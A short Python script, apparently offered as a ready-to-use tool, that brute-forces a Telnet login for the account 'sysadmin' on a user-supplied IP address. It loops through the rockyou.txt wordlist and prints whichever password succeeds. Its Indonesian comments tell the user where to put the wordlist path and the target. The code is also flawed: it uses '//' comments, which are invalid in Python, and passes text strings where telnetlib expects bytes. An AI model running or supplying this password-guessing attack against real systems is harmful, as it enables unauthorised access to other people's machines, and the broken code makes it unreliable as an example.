import sys
import socket
import telnetlib

wordList = open("<path_to_rockyou.txt>", "r") // Ganti <path_to_rockyou.txt> ke filepath rockyou.txt
host = "<IP ADDRESS>" // Ganti <IP ADDRESS> ke IP Address yang akan digunakan
user = "sysadmin"

def brute_force_telnet(passwd):
    tn = telnetlib.Telnet(host)
    try:
        tn.read_until("Login :")
    except EOFError:
        print("Error: read(login) failed")
    try:
        tn.write(user + "\n")
    except socket.error:
        print("Error: write(username) failed")
    if passwd:
        try:
            tn.read_until("Password :")
        except EOFError:
            print("Error: read(password) failed")
        try:
            tn.write(passwd + "\n")
        except socket.error:
            print("Error: write(password) failed")

        print("Password implemented...")

        i = None  # Initialize the 'i' variable
        try:
            (i, obj, byt) = tn.expect([b'incorrect', b'@'], 2)
        except EOFError:
            print("Error occurred")
        if i == 1:
            return True
        tn.close()
        return False

passwords = wordList.readlines()
for pwd in passwords:
    passwd = pwd.strip()
    print("Testing", passwd)
    if brute_force_telnet(passwd):
        print("password is ->", passwd)
        break
wordList.close()